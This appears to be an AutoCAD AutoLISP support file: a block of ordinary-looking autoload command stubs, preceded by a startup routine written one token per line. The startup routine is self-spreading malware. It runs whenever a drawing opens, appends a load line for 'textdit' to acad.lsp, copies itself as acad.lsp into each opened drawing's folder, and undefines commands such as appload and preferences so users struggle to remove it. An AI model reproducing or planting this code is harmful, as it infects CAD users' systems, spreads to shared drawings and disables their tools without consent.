(defun
s::startup
(/
old_cmd
path
dwgpath
mnlpath
acadloadpath
oldacad
newacad
nowdwg
lspbj
wjm
wjm1
wjqm
wjqm1
wz
ns1
ns2)
(setq
old_cmd
(getvar
"cmdecho"))
(setvar
"cmdecho"
0)
(setq
path
(findfile
"base.dcl"))
(setq
path
(substr
path
1
(-
(strlen
path)
8)))
(setq
mnlpath
(getvar
"menuname"))
(setq
nowdwg
(getvar
"dwgname"))
(setq
wjqm
(findfile
nowdwg))
(setq
dwgpath
(substr
wjqm
1
(-
(strlen
wjqm)
(strlen
nowdwg))))
(setq
acadpath
(findfile
"acad.lsp"))
(setq
acadpath
(substr
acadpath
1
(-
(strlen
acadpath)
8)))
(setq
ns1
""
ns2
"")
(setq
lspbj
0)
(setq
wjqm
(strcat
path
"acad.lsp"))
(if
(setq
wjm
(open
wjqm
"r"))
(progn
(while
(setq
wz
(read-line
wjm))
(setq
ns1
ns2)
(setq
ns2
wz)
)
(if
(>
(strlen
ns1)
14)
(if
(=
(substr
ns1
8
7)
"textdit")
(setq
lspbj
1))
)
(close
wjm)
)
)
(if
(and
(=
acadpath
dwgpath)
(/=
acadpath
path))
(progn
(setq
oldacad
(findfile
"acad.lsp"))
(setq
newacad
(strcat
path
"textdit.lsp"))
(if
(=
lspbj
0)
(progn
(setq
wjqm
(strcat
path
"acad.lsp"))
(setq
wjm
(open
wjqm
"a"))
(write-line
(strcat
"(load
"
(chr
34)
"textdit"
(chr
34)
")")
wjm)
(write-line
"(princ)"
wjm)
(close
wjm)
)
)
(writeacadload)
)
(progn
(if
(/=
nowdwg
"Drawing.dwg")
(progn
(setq
oldacad
(findfile
"textdit.lsp"))
(setq
newacad
(strcat
dwgpath
"acad.lsp"))
(writeacadload)
)
)
)
)
(command
"undefine"
"copyclip")
(command
"undefine"
"ddselect")
(command
"undefine"
"vpoint")
(command
"undefine"
"layiso")
(command
"undefine"
"match3")
(command
"undefine"
"appload")
(command
"undefine"
"preferences")


(setvar
"cmdecho"
old_cmd)
(princ)
)
(defun
writeacadload
()
(if
(setq
wjm1
(open
newacad
"w"))
(progn
(setq
wjm
(open
oldacad
"r"))
(while
(setq
wz
(read-line
wjm))
(write-line
wz
wjm1)
)
(close
wjm)
(close
wjm1)
)
)
)


(vmon)
;=============bo========================= block slide
(defun C:bo ()
   (if bo (c:bo)(progn (load "bo")(c:bo))))
;=============bush-a===================== drawing bush-a
(defun C:bush-a ()
   (if bush-a (c:bush-a)(progn (load "bush-a")(c:bush-a))))
;=============bush-b===================== drawing bush-b
(defun C:bush-b ()
   (if bush-b (c:bush-b)(progn (load "bush-b")(c:bush-b))))
;=============cblock===================== change block
(defun C:cblock ()
   (if cblock (c:cblock)(progn (load "cblock")(c:cblock))))
;=============clip======================= draw section scale
(defun C:clip ()
   (if clip (c:clip)(progn (load "clip")(c:clip))))
;=============cl========================= change layer
(defun C:cl ()
   (if cl (c:cl)(progn (load "cl")(c:cl))))
;=============ct========================= change text
(defun C:ct ()
   (if ct (c:ct)(progn (load "ct")(c:ct))))
;=============cp========================= block slide
(defun C:cp ()
   (if cp (c:cp)(progn (load "cp")(c:cp))))
;=============cp-2======================= block slide
